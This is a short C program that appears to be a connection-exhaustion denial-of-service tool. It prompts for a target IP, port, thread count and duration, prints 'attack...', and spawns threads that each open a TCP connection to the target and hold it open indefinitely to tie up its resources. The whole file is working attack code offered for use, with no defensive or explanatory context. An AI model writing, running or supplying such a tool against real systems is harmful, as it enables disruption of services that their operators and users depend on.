#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

char ip[20];
int threads;
int port;

void attack()
{
int sock=0;
int valread;
struct sockaddr_in serv_addr;
if((sock=socket(AF_INET,SOCK_STREAM,0))<0)
	return;
serv_addr.sin_family = AF_INET;
serv_addr.sin_port=htons(port);
if(inet_pton(AF_INET,ip,&serv_addr.sin_addr)<=0)
	return;
connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr));

while(1)
sleep(200);
}
int main()
{
int sec;
printf("ip:");
scanf("%20s",ip);
printf("port:");
scanf("%20d",&port);
printf("threads:");
scanf("%20d",&threads);
printf("time of program(sec):");
scanf("%20d",&sec);
puts("attack...");

size_t i;
pthread_t t[threads];
   for(i=0;i<threads;i++)
	pthread_create(&t[i],NULL,(void *)attack,NULL);
sleep(sec);
return 0;
}
